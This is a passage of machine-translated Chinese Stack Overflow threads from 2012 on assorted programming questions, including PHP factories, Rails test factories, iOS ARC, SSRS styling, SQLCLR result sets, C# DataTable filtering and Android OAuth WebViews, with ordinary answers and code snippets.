但除非我这样做，否则我不能：

```
$this->load->news = new news();
$this->load->news->get_article(); 
```

我想在不输入的情况下访问它`$this->load->news = new news();`。我也希望它自动实例化。任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:10:49.797

使 get_article() 成为静态方法并像这样访问它：

```
$this->load->news::get_article(); 
```

如果不实例化类的至少一个实例，就无法访​​问非静态方法。即使使用反射，您实际上也无法调用常规方法。

**您可以在加载**类中实现一个魔术方法，当您访问任何属性时，例如

```
$this->load->news->get_article(); 
```

它检查“新闻”属性的名称是否也加载了类名，如果是，但未设置为该类的实例，则创建一个并将其分配给它。

这是神奇的方法：

```
public function __get(){ ... } ; 
```

基本上，每次访问对象的...每次访问对象的不可访问属性（未声明或创建的属性）时，总会调用此魔术方法

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T21:47:59.310

您似乎正在“引导”某些严重过时的 CodeIgniter（如果您想了解详细信息，请访问 PHP 聊天室）。如果您想要高质量的代码，那将不是要模拟的框架。

哦，您正在实施的模式实际上是 MVP，而不是 MVC .. 有[区别](https://stackoverflow.com/a/7622038/727208)。

*   一开始你应该这样做是**make autoloader**，它确实有效。阅读[`spl_autoload_register()`](http://php.net/manual/en/function.spl-autoload-register.php).. 它是如何使用的，它实际上是做什么的。如果您需要一些示例，除了注释中提供的示例，您可以查找 PSR-0 的实现。它应该给你一些想法，如何在实践中使用它。

    这一切基本上都会摆脱你`$this->load->load_models('news');`在控制器中的线路。

*   在 MVC 中，**模型是层**而不是对象/类。我不打算重复整个歌曲和舞蹈，我前段时间写了一个[答案..它很长=/](https://stackoverflow.com/a/5864000/727208)

*   您不应该`new`在控制器内部使用，但原因与您认为的不同。您应该避免`new`使用 ，因为它会导致与类名的紧密耦合。相反，您应该为您的`Controller`实例提供一个`Factory`in 构造函数。

    ```
    $factory = new DomainFactory( new PDO(...), $cache );
    $controller = new Foobar( $factory );

    $controller->$command($request); 
    ```

    这可以在控制器方法中使用，如下所示：

    ```
    public function __construct( $domain_factory )
    {
        $this->factory = $domain_factory
    }

    public function do_stuff( $request )
    {
        $id = $request->getQuery('id');
        $articles = $this->factory->build('news')->get_article($id);
        // thought i would split this line into two parts
    } 
    ```

    哦..工厂会做什么，是这样的：

    ```
    public function __construct( $pdo, $cache )
    {
        $this->pdo = $pdo;
        $this->cache = $cache;
    }

    public function build( $name )
    {
        $instance = new $name;
        $instance->assign_connection( $this->pdo );
        $instance->assign_cache( $this->cache );
        return $instance;
    } 
    ```

这应该给你一些想法..

如果您想学习如何编写遵循最佳实践的优秀面向对象代码，这里有一些您可能会发现有用的链接：

*   [**图形用户界面架构**](http://martinfowler.com/eaaDev/uiArchs.html) `<= start with this`
*   [继承、多态性和测试](http://www.youtube.com/watch?v=4F72VULWFvc)
*   [高级 OO 模式](https://vimeo.com/21173483) ^(（[幻灯片](http://qafoo.com/talks/11_02_phpuk_advanced_oo_patterns.pdf)）)
*   [单元测试](http://www.youtube.com/watch?v=wEhu57pih5w)
*   [敏捷设计的原则](http://www.infoq.com/presentations/principles-agile-oo-design)
*   [全局状态和单例](http://www.youtube.com/watch?v=-FRm3VPhseI)
*   [不要找东西！](http://www.youtube.com/watch?v=RlfLCWKxHJ0)
*   [超越框架](https://vimeo.com/21145583) ^(（[幻灯片](http://www.slideshare.net/stuartherbert/beyond-frameworks)）)
*   [敏捷性和质量](https://vimeo.com/20610390) ^(（[幻灯片](http://www.slideshare.net/sebastian_bergmann/agility-and-quality-php-uk-2011)）)

# ruby-on-rails-3 - has_one 关联和 Factory Girl 的任意属性错误

> ID：11091045
> 
> 赞同：2
> 
> 时间：2012-06-18T21:06:34.360
> 
> 标签：ruby-on-rails-3, rspec, rspec2, factory-bot, rspec-rails

我正在尝试为我正在开发的 Rails 应用程序构建一个基本的购物车。

没什么特别
的， - 购物车有很多 line_item
- 每个 line_item 都有关联的一个产品和一个数量

```
 class Cart < ActiveRecord::Base
   attr_accessible :line_items
   has_many :line_items, :dependent => :destroy
 end

 class LineItem < ActiveRecord::Base
   attr_accessible :quantity, :product

   belongs_to :cart
   has_one :product
 end 
```

我正在尝试使用 RSpec 来测试这种关联，但我做错了，因为我收到一条错误消息：`DEPRECATION WARNING: You're trying to create an attribute 'line_item_id'. Writing arbitrary attributes on a model is deprecated`，我不知道为什么。

在我的 factory.rb 文件中，我将 line_item 工厂定义如下：

```
factory :line_item do
  quantity { Random.rand(1..5) }
  product
end

factory :cart do
  factory :cart_with_two_line_items do
    ignore do
      line_item_count 2
    end

    after(:create) do |cart, evaluator|
      FactoryGirl.create_list(:line_item, evaluator.line_item_count, cart_id: cart) # < 104
    end
  end
end 
```

任何我出错的指针，它可能是基本的，但我对 Rspec 还是很陌生。提前致谢。

编辑：line_item_spec.rb

```
require 'spec_helper'

describe LineItem do
before do
  @line_item = FactoryGirl.create(:line_item)
end 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-19T15:12:56.793

也许您忘记在 Product 模型中声明关联。

```
class Product < Activerecord::Base
  belongs_to :line_item 
```

belongs_to 将期望您的产品表有一个列：line_item_id。您是否运行了迁移并修改了模型？

# python - IDLE 未集成在桌面中

> ID：11091052
> 
> 赞同：1
> 
> 时间：2012-06-18T21:07:09.300
> 
> 标签：python, installation, python-idle

刚刚在 Windows7 机器上安装了 Python 2.7.3。

如何获取与 python 关联的 .py 文件（它们与记事本 ATM 相关联）以及如何获取“在 IDLE 中编辑”的上下文菜单快捷方式？不知何故，我没有在这台特定的计算机上得到它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T21:22:26.750

尝试制作一个 .py 文件，然后尝试打开它，应该会出现一个窗口，询问您用什么打开它，然后在程序文件中选择空闲。

# ios - iOS项目编译

> ID：11091059
> 
> 赞同：0
> 
> 时间：2012-06-18T21:07:50.563
> 
> 标签：ios, xcode, compiler-construction, automatic-ref-counting, llvm

我正在开发一个访问 Web 服务的项目。我找到了一个项目

[http://d1xzuxjlafny7l.cloudfront.net/downloads/PromoTest.zip](http://d1xzuxjlafny7l.cloudfront.net/downloads/PromoTest.zip)

上面的代码包括 JSON 库 [项目设置编译器 = LLVM 4.2] 我尝试在我的项目中使用该项目的部分代码。所以我将 JSON 库复制到我的项目中 [我的项目使用 Apple LLVM 3.1]，然后出现了一些错误，
例如。

```
SBJsonStreamWriterState **states;

//error:Pointer to non-const type "SBJsonStreamWriterState *" with no explicit ownership 
```

我试过使用编译器标志-fno-objc-arc，不好。我想知道它是否是ARC问题？如果是，那么为什么上面的编译器标志不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T21:19:17.167

尝试在目标级别禁用 ARC，如附图所示：

![在此处输入图像描述](../Images/0399afda9397c0434598cfa4cd627dc8.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-16T01:47:09.000

所以，我通过删除 SBJson 库解决了这个问题。我发现苹果已经写了一个 json 库。

# reporting-services - 鼠标悬停在 SSRS 中的链接操作

> ID：11091060
> 
> 赞同：1
> 
> 时间：2012-06-18T21:07:52.883
> 
> 标签：reporting-services

当您将鼠标悬停在 SSRS 报告中时，是否有可能以不同的方式显示链接？例如，在许多网站（如 stackoverflow）中，链接是蓝色的，但没有下划线，直到您将鼠标悬停在它上面。

我已经将此链接视为使用样式表的一种可能性：http: [//msdn.microsoft.com/en-us/library/ms345247.aspx](http://msdn.microsoft.com/en-us/library/ms345247.aspx)

“修改样式表对您在报表服务器上运行的已发布报表的外观没有影响。在 Reporting Services 中，报表不引用样式表。由报表服务器自动生成的即席报表使用存储的样式信息作为报表服务器程序文件中的嵌入资源。您在报表设计器中创建的报表使用您在报表定义中指定的字体、颜色和布局。样式与布局的其余部分内联创建。

我不明白最后一句话虽然“与布局的其余部分内联”，但我认为他们不是指链接格式。无论如何，我尝试更改它但没有成功。

我正在使用 SQL Server 2012

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T21:30:32.217

不确定这是否可行，但请查看服务器上的 Reporting Services\ReportManager\Styles 文件夹。

您会看到一个 ReportingSerivces.css 文件，尝试编辑它...

如果这不是正确的文件，您可以在其他文件中四处寻找或使用浏览器中的代码检查器（开发人员工具/模式）来查看正在使用的 css。

然后你需要找到你的链接使用的类并重新设置它的样式。

```
.DrillDown:hover
{
    font-size: 8pt;
    font-family: Verdana;
    color: #FF3300;
    text-decoration: underline
} 
```

# c++ - boost::interprocess::map insert 给出：对重载函数的模糊调用

> ID：11091061
> 
> 赞同：1
> 
> 时间：2012-06-18T21:07:53.187
> 
> 标签：c++, boost, boost-interprocess

我正在尝试将一些值插入到存储在共享内存中的 boost::interprocess::map 中。

问题是当我尝试编译它时它给了我“对重载函数的模棱两可的调用”，我不知道为什么。以下是一些代码片段：

```
#include <boost/interprocess/containers/map.hpp>
#include <boost/interprocess/allocators/allocator.hpp>
#include <boost/interprocess/managed_shared_memory.hpp>

typedef char * KeyType;
typedef long  ValueType;
typedef std::pair<const char *, long> Type_Value;

typedef boost::interprocess::allocator<Type_Value, boost::interprocess::managed_shared_memory::segment_manager> ShmemAllocator;
typedef boost::interprocess::map<KeyType, ValueType, std::less<KeyType>, ShmemAllocator> MyMap;

...

MyMap * myMap = segment.construct<MyMap>("CyValoresRTD")      //object name
                         (std::less<char *>() //first  ctor parameter
                         ,alloc_inst);     //second ctor parameter

...
char * text = "some text";
long value = 1234;
myMap->insert( std::make_pair(text, value) ); 
```

这个插入调用给了我一些错误：

```
vcrtdserverimpl.cpp(445) : error C2668: 'boost::interprocess_container::map<Key,T,Pred,Alloc>::insert' : ambiguous call to overloaded function
with
[
        Key=VCRTDServer::KeyType,
        T=VCRTDServer::ValueType,
        Pred=std::less<VCRTDServer::KeyType>,
        Alloc=VCRTDServer::ShmemAllocator
]
p:\lib\boost_1_39_0\boost\interprocess\containers\container\map.hpp(407): could be 'std::pair<_Ty1,_Ty2> boost::interprocess_container::map<Key,T,Pred,Alloc>::insert(const std::pair<char *,long> &)'
with
[
        _Ty1=boost::interprocess_container::containers_detail::rbtree<VCRTDServer::KeyType ,std::pair<const VCRTDServer::KeyType ,VCRTDServer::ValueType>,boost::interprocess_container::containers_detail::select1st<std::pair<const VCRTDServer::KeyType ,VCRTDServer::ValueType>>,std::less<VCRTDServer::KeyType>,VCRTDServer::ShmemAllocator>::iterator,
        _Ty2=bool,
        Key=VCRTDServer::KeyType,
        T=VCRTDServer::ValueType,
        Pred=std::less<VCRTDServer::KeyType>,
        Alloc=VCRTDServer::ShmemAllocator
]
p:\lib\boost_1_39_0\boost\interprocess\containers\container\map.hpp(396): or       'std::pair<_Ty1,_Ty2> boost::interprocess_container::map<Key,T,Pred,Alloc>::insert(const std::pair<const Key,T> &)'
with
[
        _Ty1=boost::interprocess_container::containers_detail::rbtree<VCRTDServer::KeyType ,std::pair<const VCRTDServer::KeyType ,VCRTDServer::ValueType>,boost::interprocess_container::containers_detail::select1st<std::pair<const VCRTDServer::KeyType ,VCRTDServer::ValueType>>,std::less<VCRTDServer::KeyType>,VCRTDServer::ShmemAllocator>::iterator,
        _Ty2=bool,
        Key=VCRTDServer::KeyType,
        T=VCRTDServer::ValueType,
        Pred=std::less<VCRTDServer::KeyType>,
        Alloc=VCRTDServer::ShmemAllocator
]
while trying to match the argument list '(std::pair<_Ty1,_Ty2>)'
with
[
        _Ty1=char *,
        _Ty2=int
] 
```

有没有人有任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:53:04.893

错误消息告诉您问题所在。

```
could be ...
::insert(const std::pair<char *,long> &)'

or ....
::insert(const std::pair<const Key,T> &)'

 while trying to match the argument list '(std::pair<_Ty1,_Ty2>)'
            with
            [
                    _Ty1=char *,
                    _Ty2=int
            ] 
```

`std::map`键是常量，插入的对也是常量。你可能会更好地使用 `std::string`作为一个关键。

# c# - dbType NVarChar 对此构造函数无效

> ID：11091064
> 
> 赞同：25
> 
> 时间：2012-06-18T21:08:11.163
> 
> 标签：c#, sql-server-2008, sqlclr

```
 [Microsoft.SqlServer.Server.SqlProcedure]
    public static void MyMethod()
    {
        string connectionString = "context connection=true";
        using (SqlConnection connection = new SqlConnection(connectionString))
        {
            connection.Open();
            SqlMetaData[] metaData = {
                                         new SqlMetaData("Column1", System.Data.SqlDbType.NVarChar)
                                         ,new SqlMetaData("Column1", System.Data.SqlDbType.NVarChar)
                                     };
            SqlDataRecord record = new SqlDataRecord(metaData);
            record.SetString(0,"hello world");
            SqlContext.Pipe.SendResultsRow(record);
        }
    } 
```

当我在 SQL 中运行该方法时

`EXEC MyMethod`

错误

> 消息 6522，级别 16，状态 1，过程 MyMethod，第 0 行在执行用户定义的例程或聚合“MyMethod”期间发生 .NET Framework 错误：System.ArgumentException：dbType NVarChar 对于此构造函数无效。System.ArgumentException：在 Microsoft.SqlServer.Server.SqlMetaData..ctor 的 Microsoft.SqlServer.Server.SqlMetaData.Construct（字符串名称，SqlDbType dbType，布尔 useServerDefault，Boolean isUniqueKey，SortOrder columnSortOrder，Int32 sortOrdinal）在 Microsoft.SqlServer.Server.SqlMetaData..ctor（字符串名称，SqlDbType dbType ) 在 WcfClrApps.MyNamespace.MyMethod()

如何返回我自己创建的记录？我不想运行任何 SQL。项目构建设置为 .NET 3.5。MSDN 指出 SQL 2008 R2 不支持 4.0。

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2012-06-18T23:45:33.753

问题有两个方面。1\. 需要最大长度。2\. `SendResultsStart()`/`SendResultsEnd()`是必需的。

```
 [Microsoft.SqlServer.Server.SqlProcedure]
    public static void MyMethod()
    {
        string connectionString = "context connection=true";
        using (SqlConnection connection = new SqlConnection(connectionString))
        {
            connection.Open();
            SqlMetaData[] metaData = {
                                         new SqlMetaData("Column1", System.Data.SqlDbType.NVarChar, 100)//Max length has to be specified
                                         ,new SqlMetaData("Column1", System.Data.SqlDbType.NVarChar, 100)//same story
                                     };
            SqlDataRecord record = new SqlDataRecord(metaData);
            SqlContext.Pipe.SendResultsStart(record);//SendResultsStart must be called

            //create a row and send it down the pipe
            record.SetString(0,"hello world");
            SqlContext.Pipe.SendResultsRow(record);

            SqlContext.Pipe.SendResultsEnd();//End it out

        }
    } 
```

[迭代示例](http://msdn.microsoft.com/en-us/library/microsoft.sqlserver.server.sqlpipe.sendresultsrow.aspx)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-18T21:35:03.940

从来没有用这种方式做过任何事情，但这不会奏效吗？

```
[Microsoft.SqlServer.Server.SqlProcedure]
    public static void MyMethod()
    {
        string connectionString = "context connection=true";
        using (SqlConnection connection = new SqlConnection(connectionString))
        {
            connection.Open();
            SqlMetaData[] metaData = {
                                         new SqlMetaData("Column1", System.Data.SqlDbType.VarChar)
                                         ,new SqlMetaData("Column2", System.Data.SqlDbType.VarChar)
                                     };
            SqlDataRecord record = new SqlDataRecord(metaData);
            record.SetString(0,"hello world");
            SqlContext.Pipe.SendResultsRow(record);
        }
    } 
```

# visual-studio-2010 - TFS 构建定义开始仅部署源代码而不是二进制文件

> ID：11091067
> 
> 赞同：1
> 
> 时间：2012-06-18T21:08:27.297
> 
> 标签：visual-studio-2010, tfs, msbuild

我正在使用使用持续集成的 TFS 构建定义，并立即将二进制文件部署到 IIS 站点。

（实际上，我“曾经”）

我已经实施了解决方案[Team Build: Publish local using MSDeploy](https://stackoverflow.com/questions/4041836/team-build-publish-locally-using-msdeploy)。它运行得非常酷。

过了一会儿，我在某处修改了一些东西，现在**构建定义只部署了源代码，但根本没有二进制文件**。如果我检查“drops”文件夹，则会正确创建“_PublishedWebsites”。

如何让我的输出目标再次覆盖二进制文件而不是源代码？

# mschart - 在条形图中显示所有 Y 轴 - MSChart

> ID：11091073
> 
> 赞同：1
> 
> 时间：2012-06-18T21:08:49.917
> 
> 标签：mschart

如何在图像中显示的条形图中显示 Y 轴的所有文本值

![在此处输入图像描述](../Images/b0afaf1607c58c61b57a6a4e68ebe509.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-19T09:16:30.967

Chart1.ChartAreas[0].AxisX.Interval = 1;

# java - 如何在 android 中使用 webView 获取 oAuth2 令牌？

> ID：11091074
> 
> 赞同：3
> 
> 时间：2012-06-18T21:08:50.667
> 
> 标签：java, android, authentication, oauth-2.0

如何在 android 中使用 webView 获取 oAuth2 令牌？我知道如何制作 webview 并打开 url 以获取 oAuth2 令牌，但我不知道如何在获得后从 webView 切换回应用程序，并将 oAuth2 令牌复制到变量中，有谁知道该怎么做这还是知道的好啧啧？ps 我正在尝试获取 oAuth2 令牌以访问 google api

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-09-16T15:51:50.110

也许这可能为时已晚。
但这可能会帮助面临类似问题的人。
我发现这个教程很有用：http:
[//www.learn2crack.com/2014/01/android-oauth2-webview.html](http://www.learn2crack.com/2014/01/android-oauth2-webview.html)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-19T01:04:02.163

Either set it in the title of the WebView window and get it via: [http://developer.android.com/reference/android/webkit/WebView.html#getTitle](http://developer.android.com/reference/android/webkit/WebView.html#getTitle)()

Or set a cookie in the WebView and grab it from the cookie. More info here (in section 3.2.2): [https://sites.google.com/site/oauthgoog/oauth-practices/mobile-apps-for-complex-login-systems/samplecode](https://sites.google.com/site/oauthgoog/oauth-practices/mobile-apps-for-complex-login-systems/samplecode)

That documentation is geared towards authentication and not authorization/OAuth specifically, but the same underlying techniques still apply.

# c# - 数据表过滤（多列）

> ID：11091075
> 
> 赞同：0
> 
> 时间：2012-06-18T21:08:52.583
> 
> 标签：c#, filter, datatable

您好，我有一个数据表，我想用一个不区分大小写的文本框进行过滤。换句话说，当用户开始在文本框中输入内容时，我希望`RowFilter`显示包含输入信息的任何行（同样不管大小写）。

我当前的代码将仅显示完全匹配并且仅针对单个列（“ID”）。我还想包括其他一些列，即“标题”、“用户名”、“公司”等。

有任何想法吗？

```
private void searchTextBox_TextChanged(object sender, EventArgs e)
{
   if (searchTextBox.Text.Trim() != "")
   {
      gridToTable.DefaultView.RowFilter = "ID = " + searchTextBox.Text;
   }
   else
   {
      gridToTable.DefaultView.RowFilter = string.Empty;

   }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T21:15:00.937

您可以`LIKE`在 中使用`RowFilter`并将所有过滤器与`OR`.

```
var rowFilter = string.Format(
        "ID LIKE '%{0}%' OR TITLE LIKE '%{1}%' OR Company LIKE '%{2}%' OR UserName LIKE '%{3}%'"
        , txtSearchID.Text
        , txtSearchTitle.Text
        , txtSearchCompany.Text 
        , txtSearchUserName.Text
    );  
gridToTable.DefaultView.RowFilter = rowFilter; 
```

[`DataColumn.Expression Property`](http://msdn.microsoft.com/en-us/library/system.data.datacolumn.expression.aspx) （相同的语法`DataView.RowFilter`）

但老实说，我建议[`LINQ-to-DataSet`](http://msdn.microsoft.com/en-us/library/bb386977.aspx)改用它，因为它更强大。

例如：

```
DataTable tblFiltered = gridToTable.AsEnumerable()
                       .Where(r => r.Field<int>("ID").ToString().Contains(txtSearchID.Text) 
                                || r.Field<string>("TITLE").Contains(txtSearchTitle.Text)
                                || r.Field<string>("Company").Contains(txtSearchCompany.Text)
                                || r.Field<string>("UserName").Contains(txtSearchUserName.Text))
                       .CopyToDataTable(); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-05T08:27:43.927

网格提供了三种互补的数据过滤方法。Row.Filtered - 显示或隐藏数据的最简单方法。但是，它不支持偶数驱动的数据模型，因此对于更复杂的应用程序没有用处。使用这种方法，程序员必须手动控制行的可见性，并考虑数据可以排序或分组，并且可以具有复杂的层次结构。

IFilter 接口 - 最高效便捷的过滤方式。程序员必须继承 IFilter 接口并实现 IsFiltered 方法。此方法使用行作为参数，网格确定是否需要过滤。

列中的图形过滤器。此功能使程序员能够实现任何可用于交互式数据过滤的图形过滤器。放置在下拉框中的任何图形控件都可以用作过滤器。此类过滤器的实现基于熟悉的 UITypeEditor，它可以为任何用户提供更多控制细节，您可以访问 dapfor。com

# html - 什么是适合英雄单位/展示的 HTML 5 元素？

> ID：11091081
> 
> 赞同：17
> 
> 时间：2012-06-18T21:09:18.860
> 
> 标签：html, semantic-markup

许多营销和内容密集型网站使用大文本和/或图像展示页面的主要内容，有时使用滑块，包含注册服务或下载应用程序等的号召性用语。我是不知道这个设计元素叫什么，我从 twitter bootstrap 中得到了 hero unit 一词：

[http://twitter.github.com/bootstrap/components.html#typography](http://twitter.github.com/bootstrap/components.html#typography)

我想你们中的大多数人都知道我要描述什么......如果不清楚，我可以添加截图或链接到这个问题。

我查看了几个不同的站点，有些将这个英雄单位放在一个`ASIDE`元素中，有些则使用`SECTION`，`ARTICLE`甚至`HEADER`. [再次以 twitter bootstrap 为例](http://twitter.github.com/bootstrap/index.html)：

```
<header class="jumbotron masthead">
  <div class="inner">
    <h1>Bootstrap, from Twitter</h1>
    <p>Simple and flexible HTML, CSS, and Javascript for popular user interface components and interactions.</p>
    <p class="download-info"> 
```

是`HEADER`最适合此类内容的标签吗？或者我应该使用`ASIDE`,`ARTICLE`还是`SECTION`?

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-19T09:14:12.480

来自[HTML5 doctor](http://html5doctor.com/the-section-element/)，他们讨论了如何标记主要内容：

> 像屏幕阅读器这样的辅助技术可以找到主要内容，因为它是页面内的第一件事，而不是页眉、导航或页脚。

所以我会把你的“英雄单位”包装在一个`section`. 页面上的每个相关内容组都应分组在自己的`section`中，第一部分是主要内容的开始。

不过，我会第二次 @net.uk.sweet 建议经常使用 HTML5 大纲。另外，查看[Mozilla Developers Network](https://developer.mozilla.org/en/Sections_and_Outlines_of_an_HTML5_document#The_HTML5_Outline_Algorithm)上的 HTML 大纲文章，它对我很有帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-19T00:29:18.637

我建议查看您正在考虑使用的每个标签的 w3 规范，并阅读描述和使用示例。当然，你只需要看看一个看似简单的问题引发的争论，比如[什么时候使用文章标签](http://html5doctor.com/the-article-element/)，就可以意识到这些东西是非常主观的。但是，阅读规范将使您能够更好地形成自己的观点：

1.  [http://www.whatwg.org/specs/web-apps/current-work/multipage/sections.html#the-header-element](http://www.whatwg.org/specs/web-apps/current-work/multipage/sections.html#the-header-element)
2.  [http://www.whatwg.org/specs/web-apps/current-work/multipage/sections.html#the-aside-element](http://www.whatwg.org/specs/web-apps/current-work/multipage/sections.html#the-aside-element)
3.  [http://www.whatwg.org/specs/web-apps/current-work/multipage/sections.html#the-article-element](http://www.whatwg.org/specs/web-apps/current-work/multipage/sections.html#the-article-element)
4.  [http://www.whatwg.org/specs/web-apps/current-work/multipage/sections.html#the-section-element](http://www.whatwg.org/specs/web-apps/current-work/multipage/sections.html#the-section-element)

我确实认为您的`header`标签应该包含在另一个分段元素中，以便它在层次上不等于包含它的元素中的其他页眉。该分段元素应该是什么取决于您的“英雄单元”的内容以及该内容与页面其余部分的关系。

最后，经常在[HTML5 文档大纲](http://gsnedders.html5.org/outliner/)中检查您的工作，以了解新部分的结构和包含它的页面。

# android - Android 上的本机代码分析

> ID：11091085
> 
> 赞同：2
> 
> 时间：2012-06-18T21:09:49.183
> 
> 标签：android, native, profiler

> **可能重复：**
> [实际 Android 手机上的 Android 软件 NDK 原生 c 代码分析](https://stackoverflow.com/questions/4328906/android-software-ndk-native-c-code-profiling-on-actual-android-phones)

DDMS 工具附带的方法分析器不允许本地代码使用方法分析器。是否有任何其他允许 ndk 代码分析的工具？

# iphone - 将 NSArray/NSMuatbleArray 存储在文件中

> ID：11091088
> 
> 赞同：0
> 
> 时间：2012-06-18T21:10:00.173
> 
> 标签：iphone, objective-c, ios, xcode, ios5

我开始将 NSArray 存储在文件中，但我一直得到 nil 作为响应...

苹果文档说 nil 意味着你的文件不存在，但我很确定我的文件不存在（我可能没有正确构建我的路径）......

这是我用来将 NSArray 存储在文件中的代码...

```
NSString *filePath = [[NSBundle mainBundle] pathForResource:@"scorecards" ofType:@"dgs"];

NSArray *myArray = [[NSArray alloc] initWithObjects:@"J", @"ANA", @"MY", @"GDON", nil];

[myArray writeToFile:filePath atomically:YES];

NSArray *mynewArray = [NSArray arrayWithContentsOfFile:filePath];

NSLog(@"%@", [mynewArray objectAtIndex:2]); 
```

我还截取了 Xcode 的屏幕截图，向你们展示我的文件确实存在......

![Xcode 截图](../Images/f7bf84a49f90f16ff91f80c3f7bd5fde.png)

该文件清楚地保存在**ScorecardsSaved**组中，该文件称为**scorecards**，扩展名为**dgs**（我为我的特定应用程序编写的东西 - Dot Golf Scorecard - dgs）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T21:16:18.997

实际上，您的文件路径使用该`pathForResource`方法，因此它将指向您的应用程序包中的一个位置，该位置不可写。

相反，您必须写入设备/模拟器上的应用程序文档目录。

```
NSURL *documentsDirectory = 
   [[[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory 
     inDomains:NSUserDomainMask] lastObject];
NSURL *fileURL = [documentsDirectory 
   URLByAppendingPathComponent:@"storecards.dgs"]; 
```

因此，如果您的文档的捆绑版本包含一些种子数据，请先将其复制到应用程序文档目录。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T21:27:25.843

```
NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
NSString *documentsDirectory = [paths objectAtIndex:0];
NSString *filePath = [documentsDirectory stringByAppendingPathComponent:FILE_NAME];

[myArray writeToFile:filePath atomically:YES]; 
```

# ruby - 有没有办法用 HTML/RUBY 跟踪生成的页面大小

> ID：11091090
> 
> 赞同：0
> 
> 时间：2012-06-18T21:10:02.010
> 
> 标签：ruby, haml

我想对我的 Web 应用程序页面进行分页。但是通常在第一页获取前 10 行，在第二页获取 10-20 对我来说不是一个明智的决定，因为我的数据只是文本并且变化很大。一行只能是 10 字节长，另一行是 100kb 长。所以我想按它们的大小对我的应用程序页面进行分页。例如，当页面达到 300kb 时，我希望 HAML 注意到它并刷新网站。

问题是，是否有一个变量或函数可以在生成页面时检查生成的页面大小？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T23:38:27.117

当您从数据库中提取数据时，只需持续计算您输出的数据量：

```
@some_collection.each_with_object(0) do |item, count|
  count += item.some_text_field.length + item.some_other_text_field.length
  break if count > 300
  # Proceed as usual
end 
```

请注意，上面计算的是字符数，而不是字节数。如果你想计算后者，你可以调用[`bytesize`](http://ruby-doc.org/core-1.9.3/String.html#method-i-bytesize)每个字符串而不是`length`.

# java - 将 SQLite 数据库中的字符串转换为日期/时间或 Android 中的 Doubles 用于 achartengine 图

> ID：11091092
> 
> 赞同：1
> 
> 时间：2012-06-18T21:10:02.670
> 
> 标签：java, android, sql, sqlite, achartengine

我的问题是将两个字符串：KEY_DATE 和 KEY_TIME 转换为图表的日期/时间格式。我不知道将它们转换为双打是否也是一种解决方案。

我有一个 SQLite 数据库，它有一个包含四个类型 STRING 列的表。

```
public static final String KEY_ROWID = "_id";
public static final String KEY_WORKOUT = "workout_type";
public static final String KEY_DATE = "date";
public static final String KEY_TIME = "workout_time"; 
```

此数据已使用以下 SQL 存储到数据库中。

```
db.execSQL("CREATE TABLE " + DATABASE_TABLE + " (" + KEY_ROWID
                + " INTEGER PRIMARY KEY AUTOINCREMENT, " + KEY_WORKOUT
                + " TEXT NOT NULL, " + KEY_DATE + " TEXT NOT NULL, "
                + KEY_TIME + " TEXT NOT NULL);" 
```

我的锻炼应用程序中有一个秒表。当用户在那里提交时：

*   当前系统日期转换为字符串并以 KEY_DATE 形式存储在 dB 中（格式 dd-mmm-yy）
*   小时、分钟和秒的秒表 LONG 值转换为字符串并连接为 KEY_TIME 并存储在 dB 中（格式：hh:mm:ss）

我想使用在 Eclipse 中启动并运行的[achartengine在图表中显示这些数据。](http://code.google.com/p/achartengine/)

KEY_DATE 将在 x 轴上，KEY_TIME 将在 y 轴上。

以下方法从数据库中检索 KEY_DATE 和 KEY_TIME。

```
public String getWorkoutDate(){
    String[] columns = new String[] { KEY_ROWID, KEY_WORKOUT, KEY_DATE,
            KEY_TIME };
    Cursor c = ourDatabase.query(DATABASE_TABLE, columns, null, null, null,
            null, null);
    String result = "";

    int iDate = c.getColumnIndex(KEY_DATE);

    for (c.moveToFirst(); !c.isAfterLast(); c.moveToNext()) {
        result = result + c.getString(iDate);
    }

    return result;
}

public String getWorkoutTime(){
    String[] columns = new String[] { KEY_ROWID, KEY_WORKOUT, KEY_DATE,
            KEY_TIME };
    Cursor c = ourDatabase.query(DATABASE_TABLE, columns, null, null, null,
            null, null);
    String result = "";

    int iTime = c.getColumnIndex(KEY_TIME);

    for (c.moveToFirst(); !c.isAfterLast(); c.moveToNext()) {
        result = result + c.getString(iTime);
    }

    return result;
} 
```

我创建了以下方法将字符串转换回日期和时间格式。我不确定如何使用它们，或者它们是否合适。

```
public Date stringToDate(String stringDate) throws java.text.ParseException {

    SimpleDateFormat formatter;
    Date date;
    formatter = new SimpleDateFormat("dd-MMM-yy");
    date = (Date) formatter.parse(stringDate);
    System.out.println("stringToDate: Today is " + date);

    return date;
}

public Date stringToTime(String stringTime) throws ParseException{

    SimpleDateFormat formatter;
    Date time;

    formatter = new SimpleDateFormat("hh:mm:ss");
    time =  (Date) formatter.parse(stringTime);
    System.out.println("Time: " + formatter.format(time));

    return time;

} 
```

我需要帮助将这些字符串转换为日期时间。我不知道将它们存储在什么集合类型中。

在 achartengine 示例中，x 和 y 值存储在 ArrayList 中

KEY_TIME 值在 y 轴上永远不会超过 60 分钟。所以它可以转换成 Double 例如。35 分 30 秒将是 35.3。

